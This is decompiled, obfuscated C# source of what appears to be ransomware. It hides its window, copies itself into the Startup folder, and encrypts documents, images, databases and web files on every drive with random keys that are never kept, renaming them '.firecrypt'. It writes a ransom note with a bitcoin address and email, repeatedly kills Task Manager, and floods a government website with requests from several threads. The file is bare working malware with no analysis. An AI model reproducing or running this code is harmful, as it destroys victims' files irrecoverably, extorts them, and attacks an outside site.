using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class kgVpgWkuddRDeBN
{
	private const int SW_HIDE = 0;

	private static ResourceManager rm = new ResourceManager("Library", typeof(kgVpgWkuddRDeBN).Assembly);

	private static System.Timers.Timer TuRQrZqcgHhsmFC = new System.Timers.Timer();

	private static int JDVEbLVbXizPWYh = 1;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetConsoleWindow();

	[STAThread]
	public static void Main()
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		kJYRBjlGinBLgth();
		TuRQrZqcgHhsmFC.AutoReset = true;
		TuRQrZqcgHhsmFC.Interval = 500.0;
		TuRQrZqcgHhsmFC.Elapsed += YtSLHSjyUHRojNP;
		TuRQrZqcgHhsmFC.Start();
		uPVcSxHIGLiovan();
		Console.ReadKey();
	}

	private static void kJYRBjlGinBLgth()
	{
		if (Operators.CompareString(Assembly.GetExecutingAssembly().Location, ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Startup\\ChqqpufYfKXWmps.exe", false) == 0)
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\CNHZWtPnfcnFToc-READ_ME.html"))
			{
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\CNHZWtPnfcnFToc-READ_ME.html");
			}
		}
		else
		{
			FZPGUeNNzBbkwYs();
			bJaMQqebVnkIdCI();
			XvOZOLFXUrblrnz();
			QRmoxVDfvciCKye();
		}
	}

	public static void FZPGUeNNzBbkwYs()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!Directory.Exists(folderPath + "\\SysWin32"))
		{
			try
			{
				Directory.CreateDirectory(folderPath + "\\SysWin32");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void bJaMQqebVnkIdCI()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		try
		{
			File.Copy(location, ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Startup\\ChqqpufYfKXWmps.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void YtSLHSjyUHRojNP(object sender, ElapsedEventArgs e)
	{
		Thread thread = new Thread(BkgVpgWkuddRDeB);
		thread.Start();
	}

	private static void QRmoxVDfvciCKye()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\CNHZWtPnfcnFToc-READ_ME.html";
		string @string = rm.GetString("HTML.txt");
		string path2 = folderPath + "\\SysWin32\\files.txt";
		string path3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\CNHZWtPnfcnFToc-filesencrypted.html";
		if (!File.Exists(path))
		{
			try
			{
				using StreamWriter streamWriter = File.CreateText(path);
				streamWriter.WriteLine(@string);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			aaZePIPtUGWZcUs();
		}
		StreamReader streamReader = new StreamReader(path2);
		if (!File.Exists(path3))
		{
			try
			{
				using StreamWriter streamWriter2 = File.CreateText(path3);
				while (streamReader.Peek() >= 0)
				{
					streamWriter2.WriteLine(streamReader.ReadLine() + "<br>");
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		streamReader.Close();
	}

	private static void aaZePIPtUGWZcUs()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string userName = Environment.UserName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\CNHZWtPnfcnFToc-READ_ME.html";
		object obj = File.ReadAllLines(folderPath + "\\SysWin32\\files.txt").Length;
		string newValue = "1H91foPkEGFqurFdq5zek4frCshzPZbq9V";
		string newValue2 = "gravityz3r0@sigaint.org";
		string newValue3 = userName + "-" + pskJYRBjlGinBLg(10);
		if (File.Exists(path))
		{
			StreamReader streamReader = File.OpenText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\CNHZWtPnfcnFToc-READ_ME.html");
			string text = streamReader.ReadToEnd();
			streamReader.Close();
			text = text.Replace("&Date&", Conversions.ToString(DateTime.Today.AddDays(3.0))).Replace("&FileCount&", Conversions.ToString(Operators.ConcatenateObject(obj, (object)" files encrypted securely."))).Replace("&bitwallet&", newValue)
				.Replace("#link#", "./CNHZWtPnfcnFToc-filesencrypted.html")
				.Replace("&email&", newValue2)
				.Replace("&UserID&", newValue3);
			StreamWriter streamWriter = File.CreateText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\CNHZWtPnfcnFToc-READ_ME.html");
			streamWriter.WriteLine(text);
			streamWriter.Close();
		}
	}

	public static void XvOZOLFXUrblrnz()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			try
			{
				if (driveInfo.IsReady)
				{
					thTuRQrZqcgHhsm(driveInfo.Name);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void WBkgVpgWkuddRDe(string UZmjSfFFgoBdwcB, List<string> SsSdXpZvfqwsEVj)
	{
		foreach (string item in from s in Directory.GetFiles(UZmjSfFFgoBdwcB, "*.*")
			where (s.EndsWith(".txt") || s.EndsWith(".jpg") || s.EndsWith(".png") || s.EndsWith(".doc") || s.EndsWith(".docx") || s.EndsWith(".csv") || s.EndsWith(".sql") || s.EndsWith(".mdb") || s.EndsWith(".sln") || s.EndsWith(".php") || s.EndsWith(".asp") || s.EndsWith(".aspx") || s.EndsWith(".html") || s.EndsWith(".htm") || s.EndsWith(".csx") || s.EndsWith(".psd") || s.EndsWith(".aep") || s.EndsWith(".mp3") || s.EndsWith(".pdf") || s.EndsWith(".torrent")) ? true : false
			select s)
		{
			SsSdXpZvfqwsEVj.Add(item);
		}
		string[] directories = Directory.GetDirectories(UZmjSfFFgoBdwcB);
		foreach (string uZmjSfFFgoBdwcB in directories)
		{
			try
			{
				WBkgVpgWkuddRDe(uZmjSfFFgoBdwcB, SsSdXpZvfqwsEVj);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] BNbJaMQqebVnkId(byte[] DlZukbpziiVVwFS, byte[] tNsRiujgaspMvHN)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			object obj = new Rfc2898DeriveBytes(tNsRiujgaspMvHN, salt, 1000);
			rijndaelManaged.Key = (byte[])NewLateBinding.LateGet(obj, (Type)null, "GetBytes", new object[1] { (double)rijndaelManaged.KeySize / 8.0 }, (string[])null, (Type[])null, (bool[])null);
			rijndaelManaged.IV = (byte[])NewLateBinding.LateGet(obj, (Type)null, "GetBytes", new object[1] { (double)rijndaelManaged.BlockSize / 8.0 }, (string[])null, (Type[])null, (bool[])null);
			rijndaelManaged.Mode = CipherMode.CBC;
			object obj2 = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				object[] array = new object[3] { DlZukbpziiVVwFS, 0, DlZukbpziiVVwFS.Length };
				bool[] array2 = new bool[3] { true, false, false };
				NewLateBinding.LateCall(obj2, (Type)null, "Write", array, (string[])null, (Type[])null, array2, true);
				if (array2[0])
				{
					DlZukbpziiVVwFS = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
				}
				NewLateBinding.LateCall(obj2, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			finally
			{
				if (obj2 != null)
				{
					((IDisposable)obj2).Dispose();
				}
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static void CIEQThDFOYTwMey(string rHLOGetmWEHbEIW, string gCPCoQmkNuMxCbC)
	{
		byte[] dlZukbpziiVVwFS = File.ReadAllBytes(rHLOGetmWEHbEIW);
		byte[] bytes = Encoding.UTF8.GetBytes(gCPCoQmkNuMxCbC);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = BNbJaMQqebVnkId(dlZukbpziiVVwFS, bytes);
		File.WriteAllBytes(rHLOGetmWEHbEIW, bytes2);
		File.Move(rHLOGetmWEHbEIW, rHLOGetmWEHbEIW + Convert.ToString(".firecrypt"));
	}

	public static int SMChqqpufYfKXWm(RNGCryptoServiceProvider rUZmjSfFFgoBdwc, int BSsSdXpZvfqwsEV)
	{
		byte[] array = new byte[4];
		int num;
		do
		{
			rUZmjSfFFgoBdwc.GetBytes(array);
			num = BitConverter.ToInt32(array, 0) & 0x7FFFFFFF;
		}
		while ((double)num >= (double)BSsSdXpZvfqwsEV * (2147483647.0 / (double)BSsSdXpZvfqwsEV));
		return num % BSsSdXpZvfqwsEV;
	}

	public static string pskJYRBjlGinBLg(int GDlZukbpziiVVwF)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rUZmjSfFFgoBdwc = new RNGCryptoServiceProvider())
		{
			while (Math.Max(Interlocked.Decrement(ref GDlZukbpziiVVwF), checked(GDlZukbpziiVVwF + 1)) > 0)
			{
				stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[SMChqqpufYfKXWm(rUZmjSfFFgoBdwc, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	private static void thTuRQrZqcgHhsm(string targetDirectory)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string path = folderPath + "\\SysWin32\\files.txt";
		if (!File.Exists(path))
		{
			try
			{
				using StreamWriter streamWriter = File.CreateText(path);
				List<string> list = new List<string>();
				WBkgVpgWkuddRDe(targetDirectory, list);
				list.ToArray();
				foreach (string item in list)
				{
					try
					{
						CIEQThDFOYTwMey(item, pskJYRBjlGinBLg(32));
						streamWriter.WriteLine(item);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return;
			}
		}
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			using StreamWriter streamWriter2 = File.AppendText(path);
			List<string> list2 = new List<string>();
			WBkgVpgWkuddRDe(targetDirectory, list2);
			list2.ToArray();
			foreach (string item2 in list2)
			{
				try
				{
					CIEQThDFOYTwMey(item2, pskJYRBjlGinBLg(32));
					streamWriter2.WriteLine(item2);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private static void BkgVpgWkuddRDeB()
	{
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			try
			{
				process.Kill();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void uPVcSxHIGLiovan()
	{
		try
		{
			Thread thread = new Thread(OwKjjLTgIcHfwXx);
			Thread thread2 = new Thread(OwKjjLTgIcHfwXx);
			Thread thread3 = new Thread(OwKjjLTgIcHfwXx);
			Thread thread4 = new Thread(OwKjjLTgIcHfwXx);
			Thread thread5 = new Thread(OwKjjLTgIcHfwXx);
			thread.Start();
			thread2.Start();
			thread3.Start();
			thread4.Start();
			thread5.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void OwKjjLTgIcHfwXx()
	{
		int num = 0;
		checked
		{
			do
			{
				WebRequest webRequest = WebRequest.Create("http://www.pta.gov.pk/index.php");
				using (WebResponse webResponse = webRequest.GetResponse())
				{
					using StreamReader streamReader = new StreamReader(webResponse.GetResponseStream());
					string contents = streamReader.ReadToEnd();
					File.WriteAllText(Path.GetTempPath() + "\\aZePIPtUGWZcUsW-" + Conversions.ToString(JDVEbLVbXizPWYh) + ".html", contents);
					JDVEbLVbXizPWYh++;
				}
				num--;
				num++;
			}
			while (num <= 2);
		}
	}
}
